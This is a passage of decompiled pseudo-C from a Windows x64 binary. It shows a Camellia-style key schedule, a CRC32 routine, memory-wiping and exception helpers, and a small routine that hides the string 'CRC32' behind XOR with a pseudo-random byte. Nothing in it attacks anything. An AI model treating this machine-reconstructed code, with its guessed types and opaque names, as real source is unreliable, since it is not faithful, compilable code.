  __int64 v5; // rcx
  unsigned int v6; // ebp
  int v7; // eax
  int v8; // er15
  __int64 v9; // r13
  signed int v10; // esi
  int v11; // er14
  unsigned __int32 v12; // ebx
  unsigned __int32 v13; // er12
  unsigned __int32 v14; // er11
  unsigned __int32 v15; // er9
  unsigned __int64 *v16; // r15
  unsigned __int64 v17; // r8
  unsigned __int64 v18; // rdx
  __int64 v19; // r14
  unsigned int v20; // er11
  int v21; // ebx
  int v22; // ebp
  int v23; // er8
  int v24; // ebp
  int v25; // er10
  unsigned int v26; // er8
  int v27; // esi
  unsigned int v28; // edi
  unsigned int v29; // esi
  int v30; // ebx
  int v31; // er8
  unsigned int v32; // ebx
  unsigned int v33; // er11
  int v34; // er9
  __int64 v35; // rcx
  unsigned __int64 v36; // r10
  unsigned __int64 v37; // r9
  unsigned __int64 v38; // r8
  unsigned __int64 v39; // rdx
  unsigned __int64 result; // rax
  __int64 v41; // r12
  unsigned __int32 v42; // er14
  unsigned __int32 v43; // er13
  unsigned int v44; // esi
  unsigned int v45; // ebp
  unsigned int v46; // ST20_4
  unsigned __int64 v47; // r10
  unsigned __int64 v48; // r9
  unsigned __int64 v49; // r8
  unsigned __int64 v50; // rdx
  int v51; // er11
  int v52; // edi
  int v53; // ebx
  int v54; // edi
  int v55; // er14
  int v56; // ebp
  int v57; // er14
  int v58; // esi
  unsigned int v59; // er11
  unsigned int v60; // esi
  unsigned int v61; // ebp
  unsigned int v62; // er14
  unsigned __int64 v63; // r8
  unsigned __int64 v64; // rdx
  unsigned int v65; // ebp
  unsigned int v66; // er14
  unsigned int v67; // er11
  unsigned int v68; // esi
  unsigned __int64 v69; // r8
  unsigned __int64 v70; // rdx
  unsigned __int32 v71; // [rsp+24h] [rbp-54h]
  unsigned __int32 v72; // [rsp+28h] [rbp-50h]
  unsigned __int32 v73; // [rsp+2Ch] [rbp-4Ch]
  unsigned __int32 v74; // [rsp+80h] [rbp+8h]
  unsigned int v75; // [rsp+88h] [rbp+10h]
  unsigned __int32 v76; // [rsp+90h] [rbp+18h]

  v3 = a2;
  v4 = a1;
  v5 = a1 + 32;
  v6 = a3;
  v7 = 4 - (a3 < 0x18);
  *(_DWORD *)(v5 - 8) = v7;
  v8 = 8 * v7 + 2;
  sub_14008F180(v5, (unsigned int)(2 * v8));
  v9 = *(_QWORD *)(v4 + 48);
  v10 = 0;
  v11 = 0;
  if ( !(*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)(v4 + 8) + 56i64))(v4 + 8) )
  {
    v10 = -1;
    v11 = v8 - 1;
  }
  v12 = _byteswap_ulong(v3[1]);
  v13 = _byteswap_ulong(v3[2]);
  v14 = _byteswap_ulong(*v3);
  v15 = _byteswap_ulong(v3[3]);
  v16 = (unsigned __int64 *)(v9 + 8i64 * v11);
  v71 = v14;
  v17 = v12 | ((unsigned __int64)v14 << 32);
  v72 = v12;
  v18 = v15 | ((unsigned __int64)v13 << 32);
  v74 = v13;
  v76 = v15;
  if ( v6 == 16 )
  {
    v19 = v10;
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFFF0ui64) + 8) = v17;
    *v16 = v18;
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFFC0ui64) + 32) = (v18 << 15) | (v17 >> 49);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFFB0ui64) + 40) = (v17 << 15) | (v18 >> 49);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF60ui64) + 80) = (v17 >> 19) | (v18 << 45);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF50ui64) + 88) = (v18 >> 19) | (v17 << 45);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF40ui64) + 96) = (v17 >> 4) | (v18 << 60);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFEF0ui64) + 136) = (v18 << 13) | (v17 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF00ui64) + 128) = (v17 << 13) | (v18 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFED0ui64) + 152) = (v17 >> 34) | (v18 << 30);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFEE0ui64) + 144) = (v17 << 30) | (v18 >> 34);
    v20 = v14 ^ 0xA09E667F;
    v21 = v12 ^ 0x3BCC908B;
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFE90ui64) + 184) = (v17 >> 17) | (v18 << 47);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFEA0ui64) + 176) = (v18 >> 17) | (v17 << 47);
    v22 = dword_1400B3980[(unsigned __int8)v20 + 768] ^ dword_1400B3980[BYTE1(v20) + 512] ^ dword_1400B3980[BYTE2(v20) + 256] ^ dword_1400B3980[HIBYTE(v20)];
    v23 = v22 ^ dword_1400B3980[(unsigned __int8)v21] ^ dword_1400B3980[BYTE1(v21) + 768] ^ dword_1400B3980[BYTE2(v21) + 512] ^ dword_1400B3980[HIBYTE(v21) + 256];
    v24 = v15 ^ v23 ^ __ROR4__(v22, 8);
    v25 = v13 ^ v23;
    v26 = v13 ^ v23 ^ 0xB67AE858;
    v27 = dword_1400B3980[(unsigned __int8)v26 + 768] ^ dword_1400B3980[BYTE1(v26) + 512] ^ dword_1400B3980[BYTE2(v26) + 256] ^ dword_1400B3980[HIBYTE(v26)];
    v28 = v27 ^ dword_1400B3980[(unsigned __int8)(v24 ^ 0xB2)] ^ dword_1400B3980[((unsigned __int16)(v24 ^ 0x73B2) >> 8)
                                                                               + 768] ^ dword_1400B3980[(unsigned __int8)((v24 ^ 0x4CAA73B2u) >> 16) + 512] ^ dword_1400B3980[((v24 ^ 0x4CAA73B2u) >> 24) + 256];
    v29 = v28 ^ __ROR4__(v27, 8);
    v30 = dword_1400B3980[(unsigned __int8)(v28 ^ 0x2F) + 768] ^ dword_1400B3980[((unsigned __int16)(v28 ^ 0x372F) >> 8)
                                                                               + 512] ^ dword_1400B3980[(unsigned __int8)((v28 ^ 0xC6EF372F) >> 16) + 256] ^ dword_1400B3980[(v28 ^ 0xC6EF372F) >> 24];
    v31 = v30 ^ dword_1400B3980[(unsigned __int8)(v29 ^ 0xBE)] ^ dword_1400B3980[((unsigned __int16)(v29 ^ 0x82BE) >> 8)
                                                                               + 768] ^ dword_1400B3980[(unsigned __int8)((v29 ^ 0xE94F82BE) >> 16) + 512] ^ dword_1400B3980[((v29 ^ 0xE94F82BE) >> 24) + 256];
    v32 = v15 ^ v24 ^ v31 ^ __ROR4__(v30, 8);
    v33 = v13 ^ v25 ^ v31;
    v34 = dword_1400B3980[(unsigned __int8)(v33 ^ 0xA5) + 768] ^ dword_1400B3980[((unsigned __int16)(v33 ^ 0x53A5) >> 8)
                                                                               + 512] ^ dword_1400B3980[(unsigned __int8)((v33 ^ 0x54FF53A5) >> 16) + 256] ^ dword_1400B3980[(v33 ^ 0x54FF53A5) >> 24];
    v35 = v34 ^ dword_1400B3980[(unsigned __int8)(v32 ^ 0x1C)] ^ dword_1400B3980[((unsigned __int16)(v32 ^ 0x6F1C) >> 8)
                                                                               + 768] ^ dword_1400B3980[(unsigned __int8)((v32 ^ 0xF1D36F1C) >> 16) + 512] ^ (unsigned int)dword_1400B3980[((v32 ^ 0xF1D36F1C) >> 24) + 256];
    v36 = ((v35 ^ v28) << 32) | v35 ^ v29 ^ (unsigned __int64)(unsigned int)__ROR4__(v34, 8);
    v37 = v32 | ((unsigned __int64)v33 << 32);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFFD0ui64) + 24) = v36;
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFFE0ui64) + 16) = v37;
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFFA0ui64) + 48) = (v37 << 15) | (v36 >> 49);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF90ui64) + 56) = (v36 << 15) | (v37 >> 49);
    v38 = (v36 >> 34) | (v37 << 30);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF80ui64) + 64) = v38;
    v39 = (v36 << 30) | (v37 >> 34);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF70ui64) + 72) = v39;
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF30ui64) + 104) = (v37 >> 19) | (v36 << 45);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF20ui64) + 112) = (v36 >> 4) | (v37 << 60);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFF10ui64) + 120) = (v37 >> 4) | (v36 << 60);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFEB0ui64) + 168) = v38;
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFEC0ui64) + 160) = v39;
    result = v19 & 0xFFFFFFFFFFFFFE80ui64;
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFE80ui64) + 192) = (v36 >> 17) | (v37 << 47);
    *(unsigned __int64 *)((char *)v16 + (v19 & 0xFFFFFFFFFFFFFE70ui64) + 200) = (v37 >> 17) | (v36 << 47);
  }
  else
  {
    v41 = v10;
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFFF0ui64) + 8) = v17;
    *v16 = v18;
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF40ui64) + 96) = (v17 >> 19) | (v18 << 45);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF30ui64) + 104) = (v18 >> 19) | (v17 << 45);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFF00ui64) + 128) = (v17 >> 4) | (v18 << 60);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFEF0ui64) + 136) = (v18 >> 4) | (v17 << 60);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFE90ui64) + 184) = (v18 << 13) | (v17 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFEA0ui64) + 176) = (v17 << 13) | (v18 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFE10ui64) + 248) = (v17 >> 17) | (v18 << 47);
    *(unsigned __int64 *)((char *)v16 + (v10 & 0xFFFFFFFFFFFFFE20ui64) + 240) = (v18 >> 17) | (v17 << 47);
    v42 = _byteswap_ulong(v3[4]);
    v73 = v42;
    v43 = _byteswap_ulong(v3[5]);
    if ( v6 == 24 )
    {
      v44 = ~v42;
      v45 = ~v43;
    }
    else
    {
      v44 = _byteswap_ulong(v3[6]);
      v45 = _byteswap_ulong(v3[7]);
    }
    v46 = v45;
    v47 = v43 | ((unsigned __int64)v42 << 32);
    v75 = v44;
    v48 = v45 | ((unsigned __int64)v44 << 32);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFFC0ui64) + 32) = (v48 << 15) | (v47 >> 49);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFFB0ui64) + 40) = (v47 << 15) | (v48 >> 49);
    v49 = (v47 >> 34) | (v48 << 30);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF80ui64) + 64) = v49;
    v50 = (v47 << 30) | (v48 >> 34);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF70ui64) + 72) = v50;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFEE0ui64) + 144) = (v47 >> 4) | (v48 << 60);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFED0ui64) + 152) = (v48 >> 4) | (v47 << 60);
    LODWORD(v47) = v14 ^ v42;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE50ui64) + 216) = v49;
    v51 = v12 ^ v43;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE60ui64) + 208) = v50;
    v52 = dword_1400B3980[(unsigned __int8)(v47 ^ 0x7F) + 768] ^ dword_1400B3980[((unsigned __int16)(v47 ^ 0x667F) >> 8)
                                                                               + 512] ^ dword_1400B3980[(unsigned __int8)(((unsigned int)v47 ^ 0xA09E667F) >> 16) + 256] ^ dword_1400B3980[((unsigned int)v47 ^ 0xA09E667F) >> 24];
    LODWORD(v49) = v52 ^ dword_1400B3980[(unsigned __int8)(v51 ^ 0x8B)] ^ dword_1400B3980[((unsigned __int16)(v51 ^ 0x908B) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v51 ^ 0x3BCC908Bu) >> 16) + 512] ^ dword_1400B3980[((v51 ^ 0x3BCC908Bu) >> 24) + 256];
    v53 = v74 ^ v44 ^ v49;
    v54 = v76 ^ v45 ^ v49 ^ __ROR4__(v52, 8);
    LODWORD(v49) = v74 ^ v44 ^ v49 ^ 0xB67AE858;
    v55 = dword_1400B3980[(unsigned __int8)v49 + 768] ^ dword_1400B3980[BYTE1(v49) + 512] ^ dword_1400B3980[BYTE2(v49) + 256] ^ dword_1400B3980[BYTE3(v49)];
    LODWORD(v49) = v55 ^ dword_1400B3980[(unsigned __int8)(v54 ^ 0xB2)] ^ dword_1400B3980[((unsigned __int16)(v54 ^ 0x73B2) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v54 ^ 0x4CAA73B2u) >> 16) + 512] ^ dword_1400B3980[((v54 ^ 0x4CAA73B2u) >> 24) + 256];
    v56 = v71 ^ v47 ^ v49;
    v57 = v72 ^ v51 ^ v49 ^ __ROR4__(v55, 8);
    LODWORD(v49) = v71 ^ v47 ^ v49 ^ 0xC6EF372F;
    v58 = dword_1400B3980[(unsigned __int8)v49 + 768] ^ dword_1400B3980[BYTE1(v49) + 512] ^ dword_1400B3980[BYTE2(v49) + 256] ^ dword_1400B3980[BYTE3(v49)];
    LODWORD(v49) = v58 ^ dword_1400B3980[(unsigned __int8)(v57 ^ 0xBE)] ^ dword_1400B3980[((unsigned __int16)(v57 ^ 0x82BE) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v57 ^ 0xE94F82BE) >> 16) + 512] ^ dword_1400B3980[((v57 ^ 0xE94F82BE) >> 24) + 256];
    v59 = v74 ^ v53 ^ v49;
    v60 = v76 ^ v54 ^ v49 ^ __ROR4__(v58, 8);
    LODWORD(v49) = v74 ^ v53 ^ v49 ^ 0x54FF53A5;
    LODWORD(v48) = dword_1400B3980[(unsigned __int8)v49 + 768] ^ dword_1400B3980[BYTE1(v49) + 512] ^ dword_1400B3980[BYTE2(v49) + 256] ^ dword_1400B3980[BYTE3(v49)];
    LODWORD(v49) = v48 ^ dword_1400B3980[(unsigned __int8)(v60 ^ 0x1C)] ^ dword_1400B3980[((unsigned __int16)(v60 ^ 0x6F1C) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v60 ^ 0xF1D36F1C) >> 16) + 512] ^ dword_1400B3980[((v60 ^ 0xF1D36F1C) >> 24) + 256];
    v61 = v49 ^ v56;
    v62 = v49 ^ __ROR4__(v48, 8) ^ v57;
    v63 = v62 | ((unsigned __int64)v61 << 32);
    v64 = v60 | ((unsigned __int64)v59 << 32);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFFA0ui64) + 48) = (v64 << 15) | (v63 >> 49);
    v65 = v73 ^ v61;
    v66 = v43 ^ v62;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF90ui64) + 56) = (v63 << 15) | (v64 >> 49);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF20ui64) + 112) = (v63 >> 19) | (v64 << 45);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF10ui64) + 120) = (v64 >> 19) | (v63 << 45);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE70ui64) + 200) = (v64 << 13) | (v63 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE80ui64) + 192) = (v63 << 13) | (v64 >> 51);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE30ui64) + 232) = (v63 >> 34) | (v64 << 30);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE40ui64) + 224) = (v63 << 30) | (v64 >> 34);
    LODWORD(v47) = dword_1400B3980[(unsigned __int8)(v65 ^ 0xFA) + 768] ^ dword_1400B3980[((unsigned __int16)(v65 ^ 0x27FA) >> 8)
                                                                                        + 512] ^ dword_1400B3980[(unsigned __int8)((v65 ^ 0x10E527FA) >> 16) + 256] ^ dword_1400B3980[(v65 ^ 0x10E527FA) >> 24];
    LODWORD(v63) = v47 ^ dword_1400B3980[(unsigned __int8)(v66 ^ 0x1D)] ^ dword_1400B3980[((unsigned __int16)(v66 ^ 0x2D1D) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v66 ^ 0xDE682D1D) >> 16) + 512] ^ dword_1400B3980[((v66 ^ 0xDE682D1D) >> 24) + 256];
    v67 = v75 ^ v63 ^ v59;
    v68 = v46 ^ v63 ^ __ROR4__(v47, 8) ^ v60;
    LODWORD(v48) = dword_1400B3980[(unsigned __int8)(v67 ^ 0xC2) + 768] ^ dword_1400B3980[((unsigned __int16)(v67 ^ 0x88C2) >> 8)
                                                                                        + 512] ^ dword_1400B3980[(unsigned __int8)((v67 ^ 0xB05688C2) >> 16) + 256] ^ dword_1400B3980[(v67 ^ 0xB05688C2) >> 24];
    LODWORD(v63) = v48 ^ dword_1400B3980[(unsigned __int8)(v68 ^ 0xFD)] ^ dword_1400B3980[((unsigned __int16)(v68 ^ 0xC1FD) >> 8)
                                                                                        + 768] ^ dword_1400B3980[(unsigned __int8)((v68 ^ 0xB3E6C1FD) >> 16) + 512] ^ dword_1400B3980[((v68 ^ 0xB3E6C1FD) >> 24) + 256];
    v69 = (((unsigned int)v63 ^ (unsigned __int64)v65) << 32) | (unsigned int)v63 ^ v66 ^ (unsigned __int64)(unsigned int)__ROR4__(v48, 8);
    v70 = v68 | ((unsigned __int64)v67 << 32);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFFD0ui64) + 24) = v69;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFFE0ui64) + 16) = v70;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF60ui64) + 80) = (v69 >> 34) | (v70 << 30);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFF50ui64) + 88) = (v69 << 30) | (v70 >> 34);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFEC0ui64) + 160) = (v69 >> 4) | (v70 << 60);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFEB0ui64) + 168) = (v70 >> 4) | (v69 << 60);
    result = v41 & 0xFFFFFFFFFFFFFE00ui64;
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFE00ui64) + 256) = (v69 >> 17) | (v70 << 47);
    *(unsigned __int64 *)((char *)v16 + (v41 & 0xFFFFFFFFFFFFFDF0ui64) + 264) = (v70 >> 17) | (v69 << 47);
  }
  return result;
}

//----- (0000000140090A70) ----------------------------------------------------
void __fastcall sub_140090A70(__int64 a1)
{
  _DWORD *v1; // rdx
  __int64 v2; // r8
  _DWORD *v3; // rdi
  __int64 i; // rcx
  __int64 j; // rcx

  v1 = *(_DWORD **)(a1 + 80);
  v2 = *(_QWORD *)(a1 + 72);
  v3 = v1;
  if ( v1 == (_DWORD *)a1 )
  {
    *(_BYTE *)(a1 + 65) = 0;
    for ( i = v2; i; --i )
    {
      *v3 = 0;
      ++v3;
    }
  }
  else
  {
    for ( j = *(_QWORD *)(a1 + 72); j; --j )
    {
      *v3 = 0;
      ++v3;
    }
    free(v1);
  }
}

//----- (0000000140090AB0) ----------------------------------------------------
__int64 __fastcall sub_140090AB0(__int64 a1)
{
  __int64 v1; // rbx

  v1 = a1;
  sub_140036DA0(a1, 1);
  *(_DWORD *)(v1 + 8) = -1;
  *(_QWORD *)v1 = &off_1400B4D80;
  return v1;
}
// 1400B4D80: using guessed type __int64 (__fastcall *off_1400B4D80)();

//----- (0000000140090AE0) ----------------------------------------------------
_QWORD *__fastcall sub_140090AE0(__int64 a1, _QWORD *a2)
{
  size_t v2; // rbx
  _QWORD *v3; // rsi
  _QWORD *v4; // rax
  _BYTE *v5; // rdi
  void *Src; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  unsigned __int64 v9; // [rsp+40h] [rbp-18h]

  v2 = 0i64;
  v3 = a2;
  v4 = sub_140090BA0(&Src);
  v5 = v4;
  if ( v4[3] >= 0x10ui64 )
    v5 = (_BYTE *)*v4;
  if ( v9 >= 0x10 )
    operator delete(Src);
  v9 = 15i64;
  v8 = 0i64;
  LOBYTE(Src) = 0;
  v3[3] = 15i64;
  v3[2] = 0i64;
  *(_BYTE *)v3 = 0;
  if ( *v5 )
  {
    v2 = -1i64;
    do
      ++v2;
    while ( v5[v2] );
  }
  sub_140004F20(v3, v5, v2);
  return v3;
}

//----- (0000000140090BA0) ----------------------------------------------------
_QWORD *__fastcall sub_140090BA0(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400DD5E4;
  v2 = 0;
  v3 = Src;
  if ( dword_1400DD5E4 & 1 )
  {
    v5 = byte_1400DD5E0;
  }
  else
  {
    v4 = 69069 * dword_1400DD5D8 + 1234567;
    v1 = dword_1400DD5E4 | 1;
    dword_1400DD5D8 = v4;
    dword_1400DD5E4 |= 1u;
    dword_1400DD5D0 = HIWORD(dword_1400DD5D0) + 36969 * (unsigned __int16)dword_1400DD5D0;
    LOBYTE(v4) = (BYTE2(dword_1400DD5DC) + 80 * dword_1400DD5DC) ^ v4;
    dword_1400DD5DC = HIWORD(dword_1400DD5DC) + 18000 * (unsigned __int16)dword_1400DD5DC;
    v5 = (((unsigned int)dword_1400DD5D4 >> 13) ^ 32 * dword_1400DD5D4 ^ dword_1400DD5D4) + v4;
    dword_1400DD5D4 ^= ((unsigned int)dword_1400DD5D4 >> 13) ^ 32 * (dword_1400DD5D4 ^ (dword_1400DD5D4 << 12));
    byte_1400DD5E0 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400DD5E4 = v1 | 2;
    byte_1400DD5E8[0] = v5 ^ 0x43;
    byte_1400DD5E9 = (v5 - 1) ^ 0x52;
    byte_1400DD5EA = (v5 - 2) ^ 0x43;
    byte_1400DD5EB = (v5 - 3) ^ 0x33;
    byte_1400DD5EC = (v5 - 4) ^ 0x32;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 5ui64 )
  {
    sub_140004790(Src, 5ui64, 0i64);
    v5 = byte_1400DD5E0;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *(_DWORD *)v6 = 0;
  *((_BYTE *)v6 + 4) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 5i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 5) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400DD5E8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 5 );
  return v3;
}
// 1400DD5D0: using guessed type int dword_1400DD5D0;
// 1400DD5D4: using guessed type int dword_1400DD5D4;
// 1400DD5D8: using guessed type int dword_1400DD5D8;
// 1400DD5DC: using guessed type int dword_1400DD5DC;
// 1400DD5E0: using guessed type char byte_1400DD5E0;
// 1400DD5E4: using guessed type int dword_1400DD5E4;
// 1400DD5E9: using guessed type char byte_1400DD5E9;
// 1400DD5EA: using guessed type char byte_1400DD5EA;
// 1400DD5EB: using guessed type char byte_1400DD5EB;
// 1400DD5EC: using guessed type char byte_1400DD5EC;

//----- (0000000140090D50) ----------------------------------------------------
__int64 __fastcall sub_140090D50(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rbx
  unsigned __int64 v4; // rdi
  __int64 v5; // rsi
  __int64 result; // rax
  _DWORD *v7; // rdx
  __int64 v8; // rsi

  v3 = a2;
  v4 = a3;
  v5 = a1;
  result = sub_140039810(a1, a3);
  *(_DWORD *)(v5 + 8) = ~*(_DWORD *)(v5 + 8);
  v7 = (_DWORD *)(v5 + 8);
  if ( v4 )
  {
    v8 = v5 - v3;
    do
    {
      result = *(unsigned __int8 *)(v8 + v3++ + 8);
      *(_BYTE *)(v3 - 1) = result;
      --v4;
    }
    while ( v4 );
  }
  *v7 = -1;
  return result;
}

//----- (0000000140090DB0) ----------------------------------------------------
__int64 __fastcall sub_140090DB0(__int64 a1, _DWORD *a2, unsigned __int64 a3)
{
  __int64 result; // rax
  signed __int64 v4; // r10
  _DWORD *v5; // r11
  __int64 v6; // rdi
  unsigned __int64 v7; // rbx
  unsigned int v8; // eax
  unsigned int v9; // er8
  unsigned int v10; // edx
  unsigned int v11; // er8
  __int64 v12; // rcx

  result = *(unsigned int *)(a1 + 8);
  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a3 >= 4 )
  {
    v7 = a3 >> 2;
    v4 = -4i64 * (a3 >> 2) + a3;
    do
    {
      v8 = *v5 ^ result;
      ++v5;
      v9 = (v8 >> 8) ^ dword_1400B4980[(unsigned __int8)v8];
      v10 = (v9 >> 8) ^ dword_1400B4980[(unsigned __int8)v9];
      v11 = (v10 >> 8) ^ dword_1400B4980[(unsigned __int8)v10];
      result = (v11 >> 8) ^ dword_1400B4980[(unsigned __int8)v11];
      --v7;
    }
    while ( v7 );
  }
  for ( ; v4; --v4 )
  {
    v12 = *(unsigned __int8 *)v5;
    v5 = (_DWORD *)((char *)v5 + 1);
    result = ((unsigned int)result >> 8) ^ dword_1400B4980[v12 ^ (unsigned __int8)result];
  }
  *(_DWORD *)(v6 + 8) = result;
  return result;
}

//----- (0000000140090E60) ----------------------------------------------------
std::exception *__fastcall sub_140090E60(std::exception *a1, const struct std::exception *a2)
{
  const struct std::exception *v2; // rbx
  std::exception *v3; // rdi
  signed __int64 v4; // rcx

  v2 = a2;
  v3 = a1;
  std::exception::exception(a1, a2);
  *(_QWORD *)v3 = &off_1400A8798;
  *((_DWORD *)v3 + 6) = *((_DWORD *)v2 + 6);
  v4 = (signed __int64)v3 + 32;
  *(_QWORD *)(v4 + 24) = 15i64;
  *(_QWORD *)(v4 + 16) = 0i64;
  *(_BYTE *)v4 = 0;
  sub_140004DF0((char *)v3 + 32, (_QWORD *)v2 + 4, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v3 = &off_1400A8798;
  return v3;
}
// 1400A19A8: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const struct std::exception *);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140090EE0) ----------------------------------------------------
_DWORD *__fastcall sub_140090EE0(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
  sub_140004F20(&Dst, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)v1);
  *(_QWORD *)v1 = &off_1400A8798;
  v1[6] = 4;
  v2 = (signed __int64)(v1 + 8);
  *(_QWORD *)(v2 + 24) = 15i64;
  *(_QWORD *)(v2 + 16) = 0i64;
  *(_BYTE *)v2 = 0;
  sub_140004DF0(v1 + 8, &Dst, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  *(_QWORD *)v1 = &off_1400A8798;
  if ( v6 >= 0x10 )
    operator delete(Dst);
  *(_QWORD *)v1 = &off_1400A8798;
  return v1;
}
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);

//----- (0000000140091020) ----------------------------------------------------
_DWORD *__fastcall sub_140091020(_DWORD *a1)
{
  _DWORD *v1; // rbx
  signed __int64 v2; // rcx
  void *Dst; // [rsp+30h] [rbp-38h]
  __int64 v5; // [rsp+40h] [rbp-28h]
  unsigned __int64 v6; // [rsp+48h] [rbp-20h]

  v1 = a1;
  v6 = 15i64;
  v5 = 0i64;
  LOBYTE(Dst) = 0;
